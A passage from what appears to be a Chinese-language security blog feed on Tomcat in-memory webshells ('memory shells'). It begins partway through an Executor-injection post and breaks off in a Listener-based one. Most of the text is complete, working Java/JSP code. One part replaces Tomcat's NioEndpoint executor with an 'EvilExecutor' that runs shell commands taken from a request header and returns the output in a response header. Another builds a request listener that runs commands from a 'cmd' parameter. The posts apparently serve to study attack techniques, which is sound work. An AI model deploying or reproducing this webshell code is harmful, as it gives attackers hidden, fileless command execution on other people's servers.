<span class="keyword">if</span> (thread.getName().contains(<span class="string">&quot;Poller&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> getField(target, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilExecutor</span> <span class="keyword">extends</span> <span class="title class_">ThreadPoolExecutor</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EvilExecutor</span><span class="params">(<span class="type">int</span> corePoolSize, <span class="type">int</span> maximumPoolSize, <span class="type">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getRequest</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> getNioEndpoint();</span><br><span class="line">                Object[] objects = (Object[]) getField(getField(nioEndpoint, <span class="string">&quot;nioChannels&quot;</span>), <span class="string">&quot;stack&quot;</span>);</span><br><span class="line">                <span class="type">ByteBuffer</span> <span class="variable">heapByteBuffer</span> <span class="operator">=</span> (ByteBuffer) getField(getField(objects[<span class="number">0</span>], <span class="string">&quot;appReadBufHandler&quot;</span>), <span class="string">&quot;byteBuffer&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">req</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(heapByteBuffer.array(), StandardCharsets.UTF_8);</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.substring(req.indexOf(<span class="string">&quot;set-reference&quot;</span>) + <span class="string">&quot;set-reference&quot;</span>.length() + <span class="number">1</span>, req.indexOf(<span class="string">&quot;\r&quot;</span>, req.indexOf(<span class="string">&quot;set-reference&quot;</span>)) - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span> cmd;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getResponse</span><span class="params">(<span class="type">byte</span>[] res)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> getNioEndpoint();</span><br><span class="line">                <span class="type">ArrayList</span> <span class="variable">processors</span> <span class="operator">=</span> (ArrayList) getField(getField(getField(nioEndpoint, <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>), <span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (Object processor : processors) &#123;</span><br><span class="line">                    <span class="type">RequestInfo</span> <span class="variable">requestInfo</span> <span class="operator">=</span> (RequestInfo) processor;</span><br><span class="line">                    <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) getField(getField(requestInfo, <span class="string">&quot;req&quot;</span>), <span class="string">&quot;response&quot;</span>);</span><br><span class="line">                    response.addHeader(<span class="string">&quot;set-message&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(res, StandardCharsets.UTF_8));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(Runnable command)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> getRequest();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] commands = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(commands).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    getResponse(output.getBytes());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.execute(command, <span class="number">0L</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Executor/11.png"></p><h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.TimeUnit&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.threads.ThreadPoolExecutor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.BlockingQueue&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.ThreadFactory&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.ByteBuffer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.charset.StandardCharsets&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.net.NioEndpoint&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getField</span><span class="params">(Object obj, String field)</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> clazz.getDeclaredField(field);</span><br><span class="line">                declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> declaredField.get(obj);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getNioEndpoint</span><span class="params">()</span> &#123;</span><br><span class="line">    Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (thread.getName().contains(<span class="string">&quot;Poller&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> getField(target, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilExecutor</span> <span class="keyword">extends</span> <span class="title class_">ThreadPoolExecutor</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EvilExecutor</span><span class="params">(<span class="type">int</span> corePoolSize, <span class="type">int</span> maximumPoolSize, <span class="type">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getRequest</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> getNioEndpoint();</span><br><span class="line">                    Object[] objects = (Object[]) getField(getField(nioEndpoint, <span class="string">&quot;nioChannels&quot;</span>), <span class="string">&quot;stack&quot;</span>);</span><br><span class="line">                    <span class="type">ByteBuffer</span> <span class="variable">heapByteBuffer</span> <span class="operator">=</span> (ByteBuffer) getField(getField(objects[<span class="number">0</span>], <span class="string">&quot;appReadBufHandler&quot;</span>), <span class="string">&quot;byteBuffer&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">req</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(heapByteBuffer.array(), StandardCharsets.UTF_8);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.substring(req.indexOf(<span class="string">&quot;set-reference&quot;</span>) + <span class="string">&quot;set-reference&quot;</span>.length() + <span class="number">1</span>, req.indexOf(<span class="string">&quot;\r&quot;</span>, req.indexOf(<span class="string">&quot;set-reference&quot;</span>)) - <span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">return</span> cmd;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getResponse</span><span class="params">(<span class="type">byte</span>[] res)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> getNioEndpoint();</span><br><span class="line">                    <span class="type">ArrayList</span> <span class="variable">processors</span> <span class="operator">=</span> (ArrayList) getField(getField(getField(nioEndpoint, <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>), <span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (Object processor : processors) &#123;</span><br><span class="line">                    <span class="type">RequestInfo</span> <span class="variable">requestInfo</span> <span class="operator">=</span> (RequestInfo) processor;</span><br><span class="line">                    <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) getField(getField(requestInfo, <span class="string">&quot;req&quot;</span>), <span class="string">&quot;response&quot;</span>);</span><br><span class="line">                    response.addHeader(<span class="string">&quot;set-message&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(res, StandardCharsets.UTF_8));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(Runnable command)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> getRequest();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String[] commands = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(commands).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    getResponse(output.getBytes());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.execute(command, <span class="number">0L</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">NioEndpoint</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> (NioEndpoint) getNioEndpoint();</span><br><span class="line">    <span class="type">ThreadPoolExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> (ThreadPoolExecutor) nioEndpoint.getExecutor();</span><br><span class="line">    nioEndpoint.setExecutor(<span class="keyword">new</span> <span class="title class_">EvilExecutor</span>(executor.getCorePoolSize(), executor.getMaximumPoolSize(),</span><br><span class="line">            executor.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, executor.getQueue(),</span><br><span class="line">            executor.getThreadFactory()));</span><br><span class="line">    response.getWriter().write(<span class="string">&quot;Executor Inject Successfully...&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Executor/12.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat MemoryShell Of Listener</title>
      <link href="/2024/05/18/Tomcat-Listener/"/>
      <url>/2024/05/18/Tomcat-Listener/</url>
      
        <content type="html"><![CDATA[<h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><p>在之前学习Filter内存马和Servlet内存马时不难看出，内存马的实现就是动态注册一个Filter&#x2F;Servlet，然后在其中编写恶意类方法，即可起到无文件落地同时可以执行命令的目的。</p><p>Listener分为以下几种：</p><ul><li>ServletContextListener，服务器启动和终止时触发；</li><li>HttpSessionListener，有关Session操作时触发；</li><li>ServletRequestListener，访问服务时触发。</li></ul><p>其中，ServletRequestListener是最适合用来作为内存马的，因为ServletRequestListener是用来监听ServletRequest对 象的，当访问任意资源时，都会触发ServletRequestListener#requestInitialized方法。</p><p><img src="/2024/05/18/Tomcat-Listener/1.png"></p><h2 id="Process-Analysis"><a href="#Process-Analysis" class="headerlink" title="Process Analysis"></a>Process Analysis</h2><p>环境搭建：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> sre.getServletRequest().getClass().getName();</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        System.out.println(<span class="string">&quot;Listener...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进javax.servlet.ServletRequestEvent，该类可以通过getServletRequest方法来获取ServletRequest。</p><p><img src="/2024/05/18/Tomcat-Listener/3.png"></p><p>运行构建的Demo，可以看到，每次请求都会触发Listener，且getServletRequest方法获取到的ServletRequest是org.apache.catalina.connector.RequestFacade。并且在org.apache.catalina.connector.RequestFacade的属性中存在Request属性，可以通过反射来获取。可以看到在下面的示例代码中，成功获取到的请求中的reuqest属性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="type">RequestFacade</span> <span class="variable">request</span> <span class="operator">=</span> (RequestFacade) sre.getServletRequest();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) field.get(request);</span><br><span class="line">            System.out.println(request1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Listener/4.png"></p><p>通过反射获取Request属性，获取其请求的参数用来执行命令，并利用其的Response将命令执行的结果回显。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="type">RequestFacade</span> <span class="variable">request</span> <span class="operator">=</span> (RequestFacade) sre.getServletRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Request</span> <span class="variable">request1</span> <span 